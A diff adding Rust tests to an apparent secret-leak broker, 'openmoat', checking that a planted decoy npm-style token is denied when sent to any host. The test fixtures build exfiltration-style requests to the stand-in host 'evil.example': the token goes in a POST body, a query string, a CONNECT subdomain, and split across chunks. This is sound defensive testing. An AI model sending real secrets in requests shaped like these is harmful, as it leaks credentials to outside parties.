@@ -374,3 +374,41 @@ fn a_plain_answer_is_stopped_before_a_value_it_echoes() {
     sent.extend_from_slice(&echo.end());
     assert_eq!(sent, benign.as_bytes());
 }
+
+/// A decoy value as `openmoat init` plants one (ADR-106), built at run time.
+fn decoy() -> String {
+    format!("{}_{}{}", "npm", "OpenMoatDecoy", "Hq3Wz8Kp1Lr6Nt9Vb4Xc2Mf")
+}
+
+#[test]
+fn a_decoy_is_refused_towards_every_host_in_any_case_and_split_across_chunks() {
+    let value = decoy();
+    let b = Broker::default().with_decoys([Zeroizing::new(value.clone())]);
+    assert!(!b.is_empty());
+    for host in ["registry.npmjs.org", "evil.example", "api.github.com"] {
+        let body = format!("POST /x HTTP/1.1\r\n\r\nt={value}");
+        let leak = b.leak(host, body.as_bytes()).unwrap();
+        assert_eq!(leak.carried, Carried::Decoy);
+        let decision = leak.decision(host);
+        assert_eq!(decision.verdict, Verdict::Deny);
+        assert_eq!(decision.rules, [openmoat_core::rule_id::CANARY]);
+        assert!(!decision.reasons.join(" ").contains(&value), "{decision:?}");
+    }
+    let lowered = format!(
+        "CONNECT {}.evil.example:443 HTTP/1.1\r\n\r\n",
+        value.to_lowercase()
+    );
+    assert!(b.leak("x", lowered.as_bytes()).is_some());
+    let (first, second) = value.split_at(10);
+    let mut watch = Watch::new(&b, "evil.example");
+    assert!(watch.next(format!("GET /?t={first}").as_bytes()).is_none());
+    assert!(watch.next(second.as_bytes()).is_some());
+    assert!(b.leak("evil.example", b"GET / HTTP/1.1\r\n\r\n").is_none());
+}
+
+#[test]
+fn a_short_decoy_value_is_not_watched_for() {
+    let b = Broker::default().with_decoys([Zeroizing::new("admin".to_owned())]);
+    assert!(b.is_empty());
+    assert!(b.leak("x", b"user=admin").is_none());
+}
